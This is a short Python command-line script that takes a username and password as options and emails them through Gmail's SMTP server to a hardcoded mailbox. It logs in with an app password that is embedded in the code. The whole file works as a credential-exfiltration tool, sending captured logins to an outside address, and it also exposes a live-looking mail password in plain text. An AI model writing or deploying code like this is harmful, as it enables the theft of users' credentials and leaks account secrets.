import click
import smtplib

@click.command()
@click.option("-u", "--user", required=False)
@click.option("-p", "--passwd", required=False)
@click.option("-v", "--verbose", is_flag=True, default=False)
def main(user, passwd, verbose):
    my_email = 'qinghao.shi@linaro.org'
    sender = my_email
    receivers = my_email
    username = my_email
    password = 'myqsknudsvmmefbm'

    msg = "\r\n".join([
    "From: qinghao.shi@linaro.org",
    "To: qinghao.shi@linaro.org",
    "Subject: New message",
    "Username is >" + str(user) + "<   Password is >" + str(passwd) + "<"
    ])

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(username,password)
    server.sendmail(sender, receivers, msg)
    server.quit()

if __name__ == "__main__":
    main()
